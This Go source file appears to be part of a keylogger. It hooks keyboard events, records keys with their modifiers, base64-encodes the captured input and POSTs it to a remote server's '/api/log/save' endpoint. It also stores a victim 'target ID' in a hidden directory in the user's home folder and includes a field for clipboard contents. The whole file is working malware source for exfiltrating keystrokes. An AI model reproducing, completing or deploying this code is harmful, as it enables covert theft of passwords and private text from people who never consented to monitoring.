package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	hook "github.com/robotn/gohook"
)

// Request body to be used when trying to upload data
type DataUploadRequestBody struct {
	Clipboard []string `json:"c"`
	Data      string   `json:"d"`
	TargetID  string   `json:"t"`
	Timestamp int64    `json:"ts"`
}

// This is marshalled, then encoded using Base64 and used in the network
// request as `Data`
type KeyboardDataStruct struct {
	Contents []string `json:"_"`
}

// Response sent by the remote server. This is the only case where the server
// will send a response.
type ResponseStruct struct {
	ID string `json:"id"`
}

// Reads and returns target ID from `.tid` (if it exists.)
// Returns an empty string otherwise.
func getTargetID() string {
	userHome, err := os.UserHomeDir()
	if err != nil {
		log.Panicf("Error: %s", err.Error())
	}

	confDir := filepath.Join(userHome, APPLICATION_DIRECTORY)
	createHiddenDirectory(confDir)

	// path to our target file
	confFile := filepath.Join(confDir, ".tid")

	// read file into `targetID`
	targetID, err := os.ReadFile(confFile)
	if os.IsNotExist(err) {
		// the file does not exist
		// return an empty string
		return ""
	}
	if err != nil && !os.IsNotExist(err) {
		// the file exists but we encountered an error
		// panic
		log.Panicf("Error: %s", err.Error())
	}

	return string(targetID)
}

// Pushes key data to `localStruct.Contents`
func writeToLocalStruct(
	event hook.Event,
	value string,
	localStruct *KeyboardDataStruct,
) {
	// get a list of modifiers
	modifiers := getModifiers(event)
	modifiersList := strings.Join(modifiers, "+")
	if len(modifiers) > 0 {
		// add a "+" symbol at the end
		modifiersList += "+"
	}

	// push new data
	localStruct.Contents = append(localStruct.Contents,
		fmt.Sprintf("%s%s", modifiersList, value))
}

// Encodes and returns data that will be uploaded to the remote server
func encodeUploadData(data KeyboardDataStruct, targetID string) []byte {
	// marshall `data`
	// this will be base64 encoded and used in `DataUploadRequestBody`
	dataStr, err := json.Marshal(data)
	if err != nil {
		log.Panicf("Error while marshalling data: %s", err.Error())
	}

	// encode `data` using base64
	b64str := base64.StdEncoding.EncodeToString(dataStr)
	var keyData DataUploadRequestBody = DataUploadRequestBody{
		Clipboard: []string{},
		Data:      b64str,
		Timestamp: time.Now().UnixMilli(),
	}

	if len(targetID) > 0 {
		// a target ID was provided
		keyData.TargetID = targetID
	}

	// marshall `keyData`
	jsonStr, err := json.Marshal(keyData)
	if err != nil {
		log.Panicf("Error while marshalling key data: %s", err.Error())
	}

	return jsonStr
}

// `POST`s `encodedData` to `<REMOTE_API_SERVER_URL>/api/log/save`.
// Saves response (if any) to `.tid`.
func uploadData(encodedData []byte) {
	// create the request URL
	apiEndpoint := fmt.Sprintf("%s/api/log/save", REMOTE_API_SERVER_URL)

	// create a new HTTP request
	req, err := http.NewRequest("POST", apiEndpoint, bytes.NewBuffer(encodedData))
	if err != nil {
		log.Panicf("Error while trying to create HTTP request: %s", err.Error())
	}

	// set headers
	req.Header.Set("Content-Type", "application/json")

	// create a new HTTP client and configure it
	client := &http.Client{}
	// see comments on https://stackoverflow.com/a/24455606
	client.Timeout = time.Second * 10
	// do the request
	res, err := client.Do(req)
	if err != nil {
		log.Panicf("Error while trying to upload data: %s", err.Error())
	}
	// resource cleanup
	defer res.Body.Close()

	// status code was not 200
	// this isn't normal
	if res.StatusCode != 200 {
		log.Panicf("Error: unknown error")
	}

	// read response body
	resBody, _ := io.ReadAll(res.Body)
	if len(resBody) > 0 {
		// some response was sent

		userHome, err := os.UserHomeDir()
		if err != nil {
			log.Panicf("Error: %s", err.Error())
		}

		confDir := filepath.Join(userHome, APPLICATION_DIRECTORY)
		createHiddenDirectory(confDir)

		confFile := filepath.Join(confDir, ".tid")

		// unmarshall the response body into `ResponseStruct`
		resStruct := ResponseStruct{}
		err = json.Unmarshal(resBody, &resStruct)
		if err != nil {
			log.Panicf("Error while unmarshalling response: %s", err.Error())
		}

		// decode `resStruct.ID` using base64
		idDecoded, err := base64.StdEncoding.DecodeString(resStruct.ID)
		if err != nil {
			log.Panicf("Error while decoding ID: %s", err.Error())
		}

		if len(resStruct.ID) > 0 {
			// `resStruct.ID` exists
			// write it to `.tid`

			err = os.WriteFile(confFile, idDecoded, 0644)
			if err != nil {
				log.Panicf("Error while writing target ID to file: %s", err.Error())
			}
		}
	}
}
